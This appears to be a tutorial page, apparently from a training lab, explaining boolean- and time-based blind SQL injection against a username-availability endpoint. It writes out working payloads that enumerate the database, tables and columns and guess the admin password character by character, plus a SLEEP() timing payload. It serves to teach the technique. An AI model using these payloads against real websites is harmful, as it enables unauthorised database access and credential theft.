---
sidebar_position: 4
---

# Blind SQLi - (Boolean - Time Based)

`Boolean Based SQLi` refers to the **Response** we receive back from our Injection attempts which could be a `[True/False - Yes/No - On/Off - 1/0]` or any Response which can only ever have two outcomes. That outcome confirms to us that our SQL Injection Payload was either Successful or Not.


<br/>

## SCENARIO

-  **Website Response:**  
	- This API Endpoint replicates a common feature found on many Signup Forms, which checks whether a username has already been registered to prompt the User to choose a different Username. Because the taken value is set to True, we can assume the Username Admin is already Registered.

```js
+-----------------------------------------------------+    +-----------+
| URL: | https://website.com/checkuser?username=admin | ➜  | RESPONSE: | ➜ {"taken":true}
+-----------------------------------------------------+    +-----------+

+-----------------------------------------------------+    +-----------+
| URL: | https://website.com/checkuser?username=user  | ➜  | RESPONSE: | ➜ {"taken":false}
+-----------------------------------------------------+    +-----------+
``` 

- **Website Processing Query:**
  
```sql
select * from users where username = '%username%' LIMIT 1;
```

<br/>

## Exploitation

- **Find the correct number of Columns:**
	- **Correct Number:** `SELECT 1,2,3`
  
```sql
user' UNION SELECT 1,2,3;-- 
```

<br/>

- **Discover Database Name:**
	- The response is **True** because `%`  will match anything as it's the **Wildcard** Value. We add Letters and Check what Matches based on the Response.
	- **Database Name:** `sqli_three`
  
```sql
user' UNION SELECT 1,2,3 where database() like 's%';-- ➜ sqli_three
```

<br/>

- **Enumerating Table Names:**
	- Same as above using the `%` Wildcard Value to until we Find a Match.
	- **Table Name:** `users`
  
```sql
user' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'users%';--
```

<br/>

- **Enumerating Column Names:**
	- Same as above using the `%` **Wildcard** Value to until we Find a Match.
	- **Column Name:** `id,username,password`
  
```sql
user' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'password%';
```

<br/>

- **After Discovering Columns:**
	- After Discovering new Columns, we can add this to our PAYLOAD so we don't keep discovering the same one.

```sql
user' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'password%' and COLUMN_NAME !='id';
```

<br/>

- **Enumerating Usernames:**
	- Same as above using the `%` **Wildcard** Value to until we Find a Match.
  
```sql
user' UNION SELECT 1,2,3 from users where username like 'admin%
```

- **Enumerating Passwords:**
	- Same as above using the `%` **Wildcard** Value to until we Find a Match.

```sql
user' UNION SELECT 1,2,3 from users where username='admin' and password like 'pa$$word%
```

<br/>

---

## Blind SQLi - Time Based

`Time-Based SQL Injection` is very similar to the Boolean Based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is **Based on the `Time` the Query takes to Complete.** 

**Time Delay is introduced by using Built-In methods** such as `SLEEP(x)` alongside the `UNION` Statement. The `SLEEP()` method will only ever get executed upon a successful `UNION SELECT` Statement. 


```sql
user' UNION SELECT SLEEP(1),2 where database() like 'sqli_four%';--
```